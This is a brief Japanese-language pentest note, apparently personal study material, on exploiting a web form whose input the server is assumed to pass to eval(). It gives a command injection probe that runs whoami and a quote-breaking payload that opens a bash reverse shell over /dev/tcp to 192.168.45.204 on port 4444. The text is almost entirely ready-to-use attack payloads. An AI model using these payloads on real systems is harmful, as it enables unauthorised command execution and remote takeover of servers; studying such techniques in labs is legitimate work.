ターゲットがeval()関数を使っていると予想した場合
入力フォームに対するコマンドインジェクションの検証
```bash
# 以下をフォームに入力する
`echo "test"&&whoami""`
⏬ #サーバ側では以下のような構文が組み立てられると予想できる
eval(`echo "test"&&whoami""`);
```

リバースシェルの取得
```bash
"; /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' ; #"
```
